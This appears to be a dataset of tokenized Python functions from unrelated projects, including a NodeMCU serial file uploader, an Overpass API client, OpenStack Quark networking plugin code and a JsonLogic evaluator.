def close ( self ) : try : if self . baud != self . start_baud : self . __set_baudrate ( self . start_baud ) self . _port . flush ( ) self . __clear_buffers ( ) except serial . serialutil . SerialException : pass log . debug ( 'closing port' ) self . _port . close ( )
def download_file ( self , filename ) : res = self . __exchange ( 'send("{filename}")' . format ( filename = filename ) ) if ( 'unexpected' in res ) or ( 'stdin' in res ) : log . error ( 'Unexpected error downloading file: %s' , res ) raise Exception ( 'Unexpected error downloading file' ) #tell device we are ready to receive self . __write ( 'C' ) #we should get a NUL terminated filename to start with sent_filename = self . __expect ( NUL ) . strip ( ) log . info ( 'receiveing ' + sent_filename ) #ACK to start download self . __write ( ACK , True ) buf = '' data = '' chunk , buf = self . __read_chunk ( buf ) #read chunks until we get an empty which is the end while chunk != '' : self . __write ( ACK , True ) data = data + chunk chunk , buf = self . __read_chunk ( buf ) return data
def read_file ( self , filename , destination = '' ) : if not destination : destination = filename log . info ( 'Transferring %s to %s' , filename , destination ) data = self . download_file ( filename ) # Just in case, the filename may contain folder, so create it if needed. log . info ( destination ) if not os . path . exists ( os . path . dirname ( destination ) ) : try : os . makedirs ( os . path . dirname ( destination ) ) except OSError as e : # Guard against race condition if e . errno != errno . EEXIST : raise with open ( destination , 'w' ) as fil : fil . write ( data )
def write_file ( self , path , destination = '' , verify = 'none' ) : filename = os . path . basename ( path ) if not destination : destination = filename log . info ( 'Transferring %s as %s' , path , destination ) self . __writeln ( "recv()" ) res = self . __expect ( 'C> ' ) if not res . endswith ( 'C> ' ) : log . error ( 'Error waiting for esp "%s"' , res ) raise CommunicationTimeout ( 'Error waiting for device to start receiving' , res ) log . debug ( 'sending destination filename "%s"' , destination ) self . __write ( destination + '\x00' , True ) if not self . __got_ack ( ) : log . error ( 'did not ack destination filename' ) raise NoAckException ( 'Device did not ACK destination filename' ) content = from_file ( path ) log . debug ( 'sending %d bytes in %s' , len ( content ) , filename ) pos = 0 chunk_size = 128 while pos < len ( content ) : rest = len ( content ) - pos if rest > chunk_size : rest = chunk_size data = content [ pos : pos + rest ] if not self . __write_chunk ( data ) : resp = self . __expect ( ) log . error ( 'Bad chunk response "%s" %s' , resp , hexify ( resp ) ) raise BadResponseException ( 'Bad chunk response' , ACK , resp ) pos += chunk_size log . debug ( 'sending zero block' ) #zero size block self . __write_chunk ( '' ) if verify != 'none' : self . verify_file ( path , destination , verify )
def exec_file ( self , path ) : filename = os . path . basename ( path ) log . info ( 'Execute %s' , filename ) content = from_file ( path ) . replace ( '\r' , '' ) . split ( '\n' ) res = '> ' for line in content : line = line . rstrip ( '\n' ) retlines = ( res + self . __exchange ( line ) ) . splitlines ( ) # Log all but the last line res = retlines . pop ( ) for lin in retlines : log . info ( lin ) # last line log . info ( res )
def __got_ack ( self ) : log . debug ( 'waiting for ack' ) res = self . _port . read ( 1 ) log . debug ( 'ack read %s' , hexify ( res ) ) return res == ACK
def __read_chunk ( self , buf ) : log . debug ( 'reading chunk' ) timeout_before = self . _port . timeout if SYSTEM != 'Windows' : # Checking for new data every 100us is fast enough if self . _port . timeout != MINIMAL_TIMEOUT : self . _port . timeout = MINIMAL_TIMEOUT end = time . time ( ) + timeout_before while len ( buf ) < 130 and time . time ( ) <= end : buf = buf + self . _port . read ( ) if buf [ 0 ] != BLOCK_START or len ( buf ) < 130 : log . debug ( 'buffer binary: %s ' , hexify ( buf ) ) raise Exception ( 'Bad blocksize or start byte' ) if SYSTEM != 'Windows' : self . _port . timeout = timeout_before chunk_size = ord ( buf [ 1 ] ) data = buf [ 2 : chunk_size + 2 ] buf = buf [ 130 : ] return ( data , buf )
def file_list ( self ) : log . info ( 'Listing files' ) res = self . __exchange ( LIST_FILES ) res = res . split ( '\r\n' ) # skip first and last lines res = res [ 1 : - 1 ] files = [ ] for line in res : files . append ( line . split ( '\t' ) ) return files
def file_do ( self , filename ) : log . info ( 'Executing ' + filename ) res = self . __exchange ( 'dofile("' + filename + '")' ) log . info ( res ) return res
def file_print ( self , filename ) : log . info ( 'Printing ' + filename ) res = self . __exchange ( PRINT_FILE . format ( filename = filename ) ) log . info ( res ) return res
def node_heap ( self ) : log . info ( 'Heap' ) res = self . __exchange ( 'print(node.heap())' ) log . info ( res ) return int ( res . split ( '\r\n' ) [ 1 ] )
def file_compile ( self , path ) : log . info ( 'Compile ' + path ) cmd = 'node.compile("%s")' % path res = self . __exchange ( cmd ) log . info ( res ) return res
def file_remove ( self , path ) : log . info ( 'Remove ' + path ) cmd = 'file.remove("%s")' % path res = self . __exchange ( cmd ) log . info ( res ) return res
def backup ( self , path ) : log . info ( 'Backing up in ' + path ) # List file to backup files = self . file_list ( ) # then download each of then self . prepare ( ) for f in files : self . read_file ( f [ 0 ] , os . path . join ( path , f [ 0 ] ) )
def operation_list ( uploader ) : files = uploader . file_list ( ) for f in files : log . info ( "{file:30s} {size}" . format ( file = f [ 0 ] , size = f [ 1 ] ) )
def main_func ( ) : parser = argparse . ArgumentParser ( description = 'NodeMCU Lua file uploader' , prog = 'nodemcu-uploader' ) parser . add_argument ( '--verbose' , help = 'verbose output' , action = 'store_true' , default = False ) parser . add_argument ( '--version' , help = 'prints the version and exists' , action = 'version' , version = '%(prog)s {version} (serial {serialversion})' . format ( version = __version__ , serialversion = serialversion ) ) parser . add_argument ( '--port' , '-p' , help = 'Serial port device' , default = Uploader . PORT ) parser . add_argument ( '--baud' , '-b' , help = 'Serial port baudrate' , type = arg_auto_int , default = Uploader . BAUD ) parser . add_argument ( '--start_baud' , '-B' , help = 'Initial Serial port baudrate' , type = arg_auto_int , default = Uploader . START_BAUD ) parser . add_argument ( '--timeout' , '-t' , help = 'Timeout for operations' , type = arg_auto_int , default = Uploader . TIMEOUT ) parser . add_argument ( '--autobaud_time' , '-a' , help = 'Duration of the autobaud timer' , type = float , default = Uploader . AUTOBAUD_TIME , ) subparsers = parser . add_subparsers ( dest = 'operation' , help = 'Run nodemcu-uploader {command} -h for additional help' ) backup_parser = subparsers . add_parser ( 'backup' , help = 'Backup all the files on the nodemcu board' ) backup_parser . add_argument ( 'path' , help = 'Folder where to store the backup' ) upload_parser = subparsers . add_parser ( 'upload' , help = 'Path to one or more files to be uploaded. Destination name will be the same as the file name.' ) upload_parser . add_argument ( 'filename' , nargs = '+' , help = 'Lua file to upload. Use colon to give alternate destination.' ) upload_parser . add_argument ( '--compile' , '-c' , help = 'If file should be uploaded as compiled' , action = 'store_true' , default = False ) upload_parser . add_argument ( '--verify' , '-v' , help = 'To verify the uploaded data.' , action = 'store' , nargs = '?' , choices = [ 'none' , 'raw' , 'sha1' ] , default = 'none' ) upload_parser . add_argument ( '--dofile' , '-e' , help = 'If file should be run after upload.' , action = 'store_true' , default = False ) upload_parser . add_argument ( '--restart' , '-r' , help = 'If esp should be restarted' , action = 'store_true' , default = False ) exec_parser = subparsers . add_parser ( 'exec' , help = 'Path to one or more files to be executed line by line.' ) exec_parser . add_argument ( 'filename' , nargs = '+' , help = 'Lua file to execute.' ) download_parser = subparsers . add_parser ( 'download' , help = 'Path to one or more files to be downloaded. Destination name will be the same as the file name.' ) download_parser . add_argument ( 'filename' , nargs = '+' , help = 'Lua file to download. Use colon to give alternate destination.' ) file_parser = subparsers . add_parser ( 'file' , help = 'File functions' ) file_parser . add_argument ( 'cmd' , choices = ( 'list' , 'do' , 'format' , 'remove' , 'print' ) , help = "list=list files, do=dofile given path, format=formate file area, remove=remove given path" ) file_parser . add_argument ( 'filename' , nargs = '*' , help = 'path for cmd' ) node_parse = subparsers . add_parser ( 'node' , help = 'Node functions' ) node_parse . add_argument ( 'ncmd' , choices = ( 'heap' , 'restart' ) , help = "heap=print heap memory, restart=restart nodemcu" ) subparsers . add_parser ( 'terminal' , help = 'Run pySerials miniterm' ) args = parser . parse_args ( ) default_level = logging . INFO if args . verbose : default_level = logging . DEBUG #formatter = logging.Formatter('%(message)s') logging . basicConfig ( level = default_level , format = '%(message)s' ) if args . operation == 'terminal' : #uploader can not claim the port terminal ( args . port , str ( args . start_baud ) ) return # let uploader user the default (short) timeout for establishing connection uploader = Uploader ( args . port , args . baud , start_baud = args . start_baud , autobaud_time = args . autobaud_time ) # and reset the timeout (if we have the uploader&timeout) if args . timeout : uploader . set_timeout ( args . timeout ) if args . operation == 'upload' : operation_upload ( uploader , args . filename , args . verify , args . compile , args . dofile , args . restart ) elif args . operation == 'download' : operation_download ( uploader , args . filename ) elif args . operation == 'exec' : sources = args . filename for path in sources : uploader . exec_file ( path ) elif args . operation == 'file' : operation_file ( uploader , args . cmd , args . filename ) elif args . operation == 'node' : if args . ncmd == 'heap' : uploader . node_heap ( ) elif args . ncmd == 'restart' : uploader . node_restart ( ) elif args . operation == 'backup' : uploader . backup ( args . path ) #no uploader related commands after this point uploader . close ( )
def _localize ( dt ) : try : tz = dt . tzinfo return tz . localize ( dt . replace ( tzinfo = None ) ) except AttributeError : return dt
def daily_at ( cls , at , target ) : daily = datetime . timedelta ( days = 1 ) # convert when to the next datetime matching this time when = datetime . datetime . combine ( datetime . date . today ( ) , at ) if when < now ( ) : when += daily return cls . at_time ( cls . _localize ( when ) , daily , target )
def get_nearest_year_for_day ( day ) : now = time . gmtime ( ) result = now . tm_year # if the day is far greater than today, it must be from last year if day - now . tm_yday > 365 // 2 : result -= 1 # if the day is far less than today, it must be for next year. if now . tm_yday - day > 365 // 2 : result += 1 return result
def get ( self , query , responseformat = "geojson" , verbosity = "body" , build = True ) : # Construct full Overpass query if build : full_query = self . _construct_ql_query ( query , responseformat = responseformat , verbosity = verbosity ) else : full_query = query if self . debug : logging . getLogger ( ) . info ( query ) # Get the response from Overpass r = self . _get_from_overpass ( full_query ) content_type = r . headers . get ( "content-type" ) if self . debug : print ( content_type ) if content_type == "text/csv" : result = [ ] reader = csv . reader ( StringIO ( r . text ) , delimiter = "\t" ) for row in reader : result . append ( row ) return result elif content_type in ( "text/xml" , "application/xml" , "application/osm3s+xml" ) : return r . text elif content_type == "application/json" : response = json . loads ( r . text ) if not build : return response # Check for valid answer from Overpass. # A valid answer contains an 'elements' key at the root level. if "elements" not in response : raise UnknownOverpassError ( "Received an invalid answer from Overpass." ) # If there is a 'remark' key, it spells trouble. overpass_remark = response . get ( "remark" , None ) if overpass_remark and overpass_remark . startswith ( "runtime error" ) : raise ServerRuntimeError ( overpass_remark ) if responseformat is not "geojson" : return response # construct geojson return self . _as_geojson ( response [ "elements" ] )
def get_resources ( cls ) : plugin = directory . get_plugin ( ) controller = SegmentAllocationRangesController ( plugin ) return [ extensions . ResourceExtension ( Segment_allocation_ranges . get_alias ( ) , controller ) ]
def get_resources ( cls ) : plugin = directory . get_plugin ( ) controller = IPAvailabilityController ( plugin ) return [ extensions . ResourceExtension ( Ip_availability . get_alias ( ) , controller ) ]
def update_ip_address ( context , id , ip_address ) : LOG . info ( "update_ip_address %s for tenant %s" % ( id , context . tenant_id ) ) ports = [ ] if 'ip_address' not in ip_address : raise n_exc . BadRequest ( resource = "ip_addresses" , msg = "Invalid request body." ) with context . session . begin ( ) : db_address = db_api . ip_address_find ( context , id = id , scope = db_api . ONE ) if not db_address : raise q_exc . IpAddressNotFound ( addr_id = id ) iptype = db_address . address_type if iptype == ip_types . FIXED and not CONF . QUARK . ipaddr_allow_fixed_ip : raise n_exc . BadRequest ( resource = "ip_addresses" , msg = "Fixed ips cannot be updated using this interface." ) reset = ip_address [ 'ip_address' ] . get ( 'reset_allocation_time' , False ) if reset and db_address [ 'deallocated' ] == 1 : if context . is_admin : LOG . info ( "IP's deallocated time being manually reset" ) db_address [ 'deallocated_at' ] = _get_deallocated_override ( ) else : msg = "Modification of reset_allocation_time requires admin" raise webob . exc . HTTPForbidden ( detail = msg ) port_ids = ip_address [ 'ip_address' ] . get ( 'port_ids' , None ) if port_ids is not None and not port_ids : raise n_exc . BadRequest ( resource = "ip_addresses" , msg = "Cannot be updated with empty port_id list" ) if iptype == ip_types . SHARED : has_owner = db_address . has_any_shared_owner ( ) if port_ids : if iptype == ip_types . FIXED and len ( port_ids ) > 1 : raise n_exc . BadRequest ( resource = "ip_addresses" , msg = "Fixed ips cannot be updated with more than one port." ) _raise_if_shared_and_enabled ( ip_address , db_address ) ports = db_api . port_find ( context , tenant_id = context . tenant_id , id = port_ids , scope = db_api . ALL ) # NOTE(name): could be considered inefficient because we're # converting to a list to check length. Maybe revisit if len ( ports ) != len ( port_ids ) : raise n_exc . PortNotFound ( port_id = port_ids ) validate_and_fetch_segment ( ports , db_address [ "network_id" ] ) validate_port_ip_quotas ( context , db_address . network_id , ports ) if iptype == ip_types . SHARED and has_owner : for assoc in db_address . associations : pid = assoc . port_id if pid not in port_ids and 'none' != assoc . service : raise q_exc . PortRequiresDisassociation ( ) LOG . info ( "Updating IP address, %s, to only be used by the" "following ports:  %s" % ( db_address . address_readable , [ p . id for p in ports ] ) ) new_address = db_api . update_port_associations_for_ip ( context , ports , db_address ) elif iptype == ip_types . SHARED and has_owner : raise q_exc . PortRequiresDisassociation ( ) elif 'deallocated' in ip_address [ 'ip_address' ] and context . is_admin : # Verify no port associations if len ( db_address . associations ) != 0 : exc_msg = ( "IP %s cannot be deallocated or allocated while" " still associated with ports: %s" % ( db_address [ 'address_readable' ] , db_address . associations ) ) raise q_exc . ActionNotAuthorized ( msg = exc_msg ) # NOTE: If an admin, allow a user to set deallocated to false # in order to reserve a deallocated IP. Alternatively, allow them # reverse that choice if a mistake was made. if ip_address [ 'ip_address' ] [ 'deallocated' ] == 'False' : db_address [ 'deallocated' ] = False else : db_address [ 'deallocated' ] = True return v . _make_ip_dict ( db_address , context . is_admin ) else : ipam_driver . deallocate_ip_address ( context , db_address ) return v . _make_ip_dict ( db_address , context . is_admin ) return v . _make_ip_dict ( new_address , context . is_admin )
def get_resources ( cls ) : ip_controller = IpAddressesController ( directory . get_plugin ( ) ) ip_port_controller = IpAddressPortController ( directory . get_plugin ( ) ) resources = [ ] resources . append ( extensions . ResourceExtension ( Ip_addresses . get_alias ( ) , ip_controller ) ) parent = { 'collection_name' : 'ip_addresses' , 'member_name' : 'ip_address' } resources . append ( extensions . ResourceExtension ( 'ports' , ip_port_controller , parent = parent ) ) return resources
def get_resources ( cls ) : plugin = directory . get_plugin ( ) controller = MacAddressRangesController ( plugin ) return [ extensions . ResourceExtension ( Mac_address_ranges . get_alias ( ) , controller ) ]
def update_security_group_rule ( context , id , security_group_rule ) : LOG . info ( "update_security_group_rule for tenant %s" % ( context . tenant_id ) ) new_rule = security_group_rule [ "security_group_rule" ] # Only allow updatable fields new_rule = _filter_update_security_group_rule ( new_rule ) with context . session . begin ( ) : rule = db_api . security_group_rule_find ( context , id = id , scope = db_api . ONE ) if not rule : raise sg_ext . SecurityGroupRuleNotFound ( id = id ) db_rule = db_api . security_group_rule_update ( context , rule , * * new_rule ) group_id = db_rule . group_id group = db_api . security_group_find ( context , id = group_id , scope = db_api . ONE ) if not group : raise sg_ext . SecurityGroupNotFound ( id = group_id ) if group : _perform_async_update_rule ( context , group_id , group , rule . id , RULE_UPDATE ) return v . _make_security_group_rule_dict ( db_rule )
def get_public_net_id ( self ) : for id , net_params in self . strategy . iteritems ( ) : if id == CONF . QUARK . public_net_id : return id return None
def add_job_to_context ( context , job_id ) : db_job = db_api . async_transaction_find ( context , id = job_id , scope = db_api . ONE ) if not db_job : return context . async_job = { "job" : v . _make_job_dict ( db_job ) }
def get_resources ( cls ) : plugin = directory . get_plugin ( ) controller = IPPoliciesController ( plugin ) return [ extensions . ResourceExtension ( Ip_policies . get_alias ( ) , controller ) ]
def _add_default_tz_bindings ( self , context , switch , network_id ) : default_tz = CONF . NVP . default_tz # If there is no default tz specified it's pointless to try # and add any additional default tz bindings. if not default_tz : LOG . warn ( "additional_default_tz_types specified, " "but no default_tz. Skipping " "_add_default_tz_bindings()." ) return # This should never be called without a neutron network uuid, # we require it to bind some segment allocations. if not network_id : LOG . warn ( "neutron network_id not specified, skipping " "_add_default_tz_bindings()" ) return for net_type in CONF . NVP . additional_default_tz_types : if net_type in TZ_BINDINGS : binding = TZ_BINDINGS [ net_type ] binding . add ( context , switch , default_tz , network_id ) else : LOG . warn ( "Unknown default tz type %s" % ( net_type ) )
def _remove_default_tz_bindings ( self , context , network_id ) : default_tz = CONF . NVP . default_tz if not default_tz : LOG . warn ( "additional_default_tz_types specified, " "but no default_tz. Skipping " "_remove_default_tz_bindings()." ) return if not network_id : LOG . warn ( "neutron network_id not specified, skipping " "_remove_default_tz_bindings()" ) return for net_type in CONF . NVP . additional_default_tz_types : if net_type in TZ_BINDINGS : binding = TZ_BINDINGS [ net_type ] binding . remove ( context , default_tz , network_id ) else : LOG . warn ( "Unknown default tz type %s" % ( net_type ) )
def _discover_via_entrypoints ( self ) : emgr = extension . ExtensionManager ( PLUGIN_EP , invoke_on_load = False ) return ( ( ext . name , ext . plugin ) for ext in emgr )
def serve_rpc ( self ) : if cfg . CONF . QUARK_ASYNC . rpc_workers < 1 : cfg . CONF . set_override ( 'rpc_workers' , 1 , "QUARK_ASYNC" ) try : rpc = service . RpcWorker ( self . plugins ) launcher = common_service . ProcessLauncher ( CONF , wait_interval = 1.0 ) launcher . launch_service ( rpc , workers = CONF . QUARK_ASYNC . rpc_workers ) return launcher except Exception : with excutils . save_and_reraise_exception ( ) : LOG . exception ( _LE ( 'Unrecoverable error: please check log for ' 'details.' ) )
def get_resources ( cls ) : plural_mappings = resource_helper . build_plural_mappings ( { } , RESOURCE_ATTRIBUTE_MAP ) # attr.PLURALS.update(plural_mappings) return resource_helper . build_resource_info ( plural_mappings , RESOURCE_ATTRIBUTE_MAP , None , register_quota = True )
def _check_collisions ( self , new_range , existing_ranges ) : def _contains ( num , r1 ) : return ( num >= r1 [ 0 ] and num <= r1 [ 1 ] ) def _is_overlap ( r1 , r2 ) : return ( _contains ( r1 [ 0 ] , r2 ) or _contains ( r1 [ 1 ] , r2 ) or _contains ( r2 [ 0 ] , r1 ) or _contains ( r2 [ 1 ] , r1 ) ) for existing_range in existing_ranges : if _is_overlap ( new_range , existing_range ) : return True return False
def delete_locks ( context , network_ids , addresses ) : addresses_no_longer_null_routed = _find_addresses_to_be_unlocked ( context , network_ids , addresses ) LOG . info ( "Deleting %s lock holders on IPAddress with ids: %s" , len ( addresses_no_longer_null_routed ) , [ addr . id for addr in addresses_no_longer_null_routed ] ) for address in addresses_no_longer_null_routed : lock_holder = None try : lock_holder = db_api . lock_holder_find ( context , lock_id = address . lock_id , name = LOCK_NAME , scope = db_api . ONE ) if lock_holder : db_api . lock_holder_delete ( context , address , lock_holder ) except Exception : LOG . exception ( "Failed to delete lock holder %s" , lock_holder ) continue context . session . flush ( )
def set ( self , model , value ) : self . validate ( value ) self . _pop ( model ) value = self . serialize ( value ) model . tags . append ( value )
def get ( self , model ) : for tag in model . tags : if self . is_tag ( tag ) : value = self . deserialize ( tag ) try : self . validate ( value ) return value except TagValidationError : continue return None
def _pop ( self , model ) : tags = [ ] # collect any exsiting tags with matching prefix for tag in model . tags : if self . is_tag ( tag ) : tags . append ( tag ) # remove collected tags from model if tags : for tag in tags : model . tags . remove ( tag ) return tags
def pop ( self , model ) : tags = self . _pop ( model ) if tags : for tag in tags : value = self . deserialize ( tag ) try : self . validate ( value ) return value except TagValidationError : continue
def has_tag ( self , model ) : for tag in model . tags : if self . is_tag ( tag ) : return True return False
def set_all ( self , model , * * tags ) : for name , tag in self . tags . items ( ) : if name in tags : value = tags . pop ( name ) if value : try : tag . set ( model , value ) except TagValidationError as e : raise n_exc . BadRequest ( resource = "tags" , msg = "%s" % ( e . message ) )
def serialize_rules ( self , rules ) : # TODO(mdietz): If/when we support other rule types, this comment #               will have to be revised. # Action and direction are static, for now. The implementation may # support 'deny' and 'egress' respectively in the future. We allow # the direction to be set to something else, technically, but current # plugin level call actually raises. It's supported here for unit # test purposes at this time serialized = [ ] for rule in rules : direction = rule [ "direction" ] source = '' destination = '' if rule . get ( "remote_ip_prefix" ) : prefix = rule [ "remote_ip_prefix" ] if direction == "ingress" : source = self . _convert_remote_network ( prefix ) else : if ( Capabilities . EGRESS not in CONF . QUARK . environment_capabilities ) : raise q_exc . EgressSecurityGroupRulesNotEnabled ( ) else : destination = self . _convert_remote_network ( prefix ) optional_fields = { } # NOTE(mdietz): this will expand as we add more protocols protocol_map = protocols . PROTOCOL_MAP [ rule [ "ethertype" ] ] if rule [ "protocol" ] == protocol_map [ "icmp" ] : optional_fields [ "icmp type" ] = rule [ "port_range_min" ] optional_fields [ "icmp code" ] = rule [ "port_range_max" ] else : optional_fields [ "port start" ] = rule [ "port_range_min" ] optional_fields [ "port end" ] = rule [ "port_range_max" ] payload = { "ethertype" : rule [ "ethertype" ] , "protocol" : rule [ "protocol" ] , "source network" : source , "destination network" : destination , "action" : "allow" , "direction" : direction } payload . update ( optional_fields ) serialized . append ( payload ) return serialized
def apply_rules ( self , device_id , mac_address , rules ) : LOG . info ( "Applying security group rules for device %s with MAC %s" % ( device_id , mac_address ) ) rule_dict = { SECURITY_GROUP_RULE_KEY : rules } redis_key = self . vif_key ( device_id , mac_address ) # TODO(mdietz): Pipeline these. Requires some rewriting self . set_field ( redis_key , SECURITY_GROUP_HASH_ATTR , rule_dict ) self . set_field_raw ( redis_key , SECURITY_GROUP_ACK , False )
def update_group_states_for_vifs ( self , vifs , ack ) : vif_keys = [ self . vif_key ( vif . device_id , vif . mac_address ) for vif in vifs ] self . set_fields ( vif_keys , SECURITY_GROUP_ACK , ack )
def get_resources ( cls ) : job_controller = JobsController ( directory . get_plugin ( ) ) resources = [ ] resources . append ( extensions . ResourceExtension ( Jobs . get_alias ( ) , job_controller ) ) return resources
def filter_factory ( global_conf , * * local_conf ) : conf = global_conf . copy ( ) conf . update ( local_conf ) def wrapper ( app ) : return ResponseAsyncIdAdder ( app , conf ) return wrapper
def get_interfaces ( self ) : LOG . debug ( "Getting interfaces from Xapi" ) with self . sessioned ( ) as session : instances = self . get_instances ( session ) recs = session . xenapi . VIF . get_all_records ( ) interfaces = set ( ) for vif_ref , rec in recs . iteritems ( ) : vm = instances . get ( rec [ "VM" ] ) if not vm : continue device_id = vm . uuid interfaces . add ( VIF ( device_id , rec , vif_ref ) ) return interfaces
def main ( notify , hour , minute ) : # Read the config file and get the admin context config_opts = [ '--config-file' , '/etc/neutron/neutron.conf' ] config . init ( config_opts ) # Have to load the billing module _after_ config is parsed so # that we get the right network strategy network_strategy . STRATEGY . load ( ) billing . PUBLIC_NETWORK_ID = network_strategy . STRATEGY . get_public_net_id ( ) config . setup_logging ( ) context = neutron_context . get_admin_context ( ) # A query to get all IPAddress objects from the db query = context . session . query ( models . IPAddress ) ( period_start , period_end ) = billing . calc_periods ( hour , minute ) full_day_ips = billing . build_full_day_ips ( query , period_start , period_end ) partial_day_ips = billing . build_partial_day_ips ( query , period_start , period_end ) if notify : # '==================== Full Day =============================' for ipaddress in full_day_ips : click . echo ( 'start: {}, end: {}' . format ( period_start , period_end ) ) payload = billing . build_payload ( ipaddress , billing . IP_EXISTS , start_time = period_start , end_time = period_end ) billing . do_notify ( context , billing . IP_EXISTS , payload ) # '==================== Part Day =============================' for ipaddress in partial_day_ips : click . echo ( 'start: {}, end: {}' . format ( period_start , period_end ) ) payload = billing . build_payload ( ipaddress , billing . IP_EXISTS , start_time = ipaddress . allocated_at , end_time = period_end ) billing . do_notify ( context , billing . IP_EXISTS , payload ) else : click . echo ( 'Case 1 ({}):\n' . format ( len ( full_day_ips ) ) ) for ipaddress in full_day_ips : pp ( billing . build_payload ( ipaddress , billing . IP_EXISTS , start_time = period_start , end_time = period_end ) ) click . echo ( '\n===============================================\n' ) click . echo ( 'Case 2 ({}):\n' . format ( len ( partial_day_ips ) ) ) for ipaddress in partial_day_ips : pp ( billing . build_payload ( ipaddress , billing . IP_EXISTS , start_time = ipaddress . allocated_at , end_time = period_end ) )
def start_rpc_listeners ( self ) : self . _setup_rpc ( ) if not self . endpoints : return [ ] self . conn = n_rpc . create_connection ( ) self . conn . create_consumer ( self . topic , self . endpoints , fanout = False ) return self . conn . consume_in_threads ( )
def context ( self ) : if not self . _context : self . _context = context . get_admin_context ( ) return self . _context
def update_sg ( self , context , sg , rule_id , action ) : db_sg = db_api . security_group_find ( context , id = sg , scope = db_api . ONE ) if not db_sg : return None with context . session . begin ( ) : job_body = dict ( action = "%s sg rule %s" % ( action , rule_id ) , resource_id = rule_id , tenant_id = db_sg [ 'tenant_id' ] ) job_body = dict ( job = job_body ) job = job_api . create_job ( context . elevated ( ) , job_body ) rpc_client = QuarkSGAsyncProducerClient ( ) try : rpc_client . populate_subtasks ( context , sg , job [ 'id' ] ) except om_exc . MessagingTimeout : LOG . error ( "Failed to create subtasks. Rabbit running?" ) return None return { "job_id" : job [ 'id' ] }
def populate_subtasks ( self , context , sg , parent_job_id ) : db_sg = db_api . security_group_find ( context , id = sg , scope = db_api . ONE ) if not db_sg : return None ports = db_api . sg_gather_associated_ports ( context , db_sg ) if len ( ports ) == 0 : return { "ports" : 0 } for port in ports : job_body = dict ( action = "update port %s" % port [ 'id' ] , tenant_id = db_sg [ 'tenant_id' ] , resource_id = port [ 'id' ] , parent_id = parent_job_id ) job_body = dict ( job = job_body ) job = job_api . create_job ( context . elevated ( ) , job_body ) rpc_consumer = QuarkSGAsyncConsumerClient ( ) try : rpc_consumer . update_port ( context , port [ 'id' ] , job [ 'id' ] ) except om_exc . MessagingTimeout : # TODO(roaet): Not too sure what can be done here other than # updating the job as a failure? LOG . error ( "Failed to update port. Rabbit running?" ) return None
def update_ports_for_sg ( self , context , portid , jobid ) : port = db_api . port_find ( context , id = portid , scope = db_api . ONE ) if not port : LOG . warning ( "Port not found" ) return net_driver = port_api . _get_net_driver ( port . network , port = port ) base_net_driver = port_api . _get_net_driver ( port . network ) sg_list = [ sg for sg in port . security_groups ] success = False error = None retries = 3 retry_delay = 2 for retry in xrange ( retries ) : try : net_driver . update_port ( context , port_id = port [ "backend_key" ] , mac_address = port [ "mac_address" ] , device_id = port [ "device_id" ] , base_net_driver = base_net_driver , security_groups = sg_list ) success = True error = None break except Exception as error : LOG . warning ( "Could not connect to redis, but retrying soon" ) time . sleep ( retry_delay ) status_str = "" if not success : status_str = "Port %s update failed after %d tries. Error: %s" % ( portid , retries , error ) update_body = dict ( completed = True , status = status_str ) update_body = dict ( job = update_body ) job_api . update_job ( context . elevated ( ) , jobid , update_body )
def segment_allocation_find ( context , lock_mode = False , * * filters ) : range_ids = filters . pop ( "segment_allocation_range_ids" , None ) query = context . session . query ( models . SegmentAllocation ) if lock_mode : query = query . with_lockmode ( "update" ) query = query . filter_by ( * * filters ) # Optionally filter by given list of range ids if range_ids : query . filter ( models . SegmentAllocation . segment_allocation_range_id . in_ ( range_ids ) ) return query
def get_resources ( cls ) : controller = RoutesController ( directory . get_plugin ( ) ) return [ extensions . ResourceExtension ( Routes . get_alias ( ) , controller ) ]
def if_ ( * args ) : for i in range ( 0 , len ( args ) - 1 , 2 ) : if args [ i ] : return args [ i + 1 ] if len ( args ) % 2 : return args [ - 1 ] else : return None
def soft_equals ( a , b ) : if isinstance ( a , str ) or isinstance ( b , str ) : return str ( a ) == str ( b ) if isinstance ( a , bool ) or isinstance ( b , bool ) : return bool ( a ) is bool ( b ) return a == b
def hard_equals ( a , b ) : if type ( a ) != type ( b ) : return False return a == b
def minus ( * args ) : if len ( args ) == 1 : return - to_numeric ( args [ 0 ] ) return to_numeric ( args [ 0 ] ) - to_numeric ( args [ 1 ] )
def merge ( * args ) : ret = [ ] for arg in args : if isinstance ( arg , list ) or isinstance ( arg , tuple ) : ret += list ( arg ) else : ret . append ( arg ) return ret
def get_var ( data , var_name , not_found = None ) : try : for key in str ( var_name ) . split ( '.' ) : try : data = data [ key ] except TypeError : data = data [ int ( key ) ] except ( KeyError , TypeError , ValueError ) : return not_found else : return data
def missing ( data , * args ) : not_found = object ( ) if args and isinstance ( args [ 0 ] , list ) : args = args [ 0 ] ret = [ ] for arg in args : if get_var ( data , arg , not_found ) is not_found : ret . append ( arg ) return ret
def missing_some ( data , min_required , args ) : if min_required < 1 : return [ ] found = 0 not_found = object ( ) ret = [ ] for arg in args : if get_var ( data , arg , not_found ) is not_found : ret . append ( arg ) else : found += 1 if found >= min_required : return [ ] return ret
def jsonLogic ( tests , data = None ) : # You've recursed to a primitive, stop! if tests is None or not isinstance ( tests , dict ) : return tests data = data or { } operator = list ( tests . keys ( ) ) [ 0 ] values = tests [ operator ] # Easy syntax for unary operators, like {"var": "x"} instead of strict # {"var": ["x"]} if not isinstance ( values , list ) and not isinstance ( values , tuple ) : values = [ values ] # Recursion! values = [ jsonLogic ( val , data ) for val in values ] if operator == 'var' : return get_var ( data , * values ) if operator == 'missing' : return missing ( data , * values ) if operator == 'missing_some' : return missing_some ( data , * values ) if operator not in operations : raise ValueError ( "Unrecognized operation %s" % operator ) return operations [ operator ] ( * values )
def unindent ( self ) : if self . tab_always_indent : cursor = self . editor . textCursor ( ) if not cursor . hasSelection ( ) : cursor . select ( cursor . LineUnderCursor ) self . unindent_selection ( cursor ) else : super ( PyIndenterMode , self ) . unindent ( )
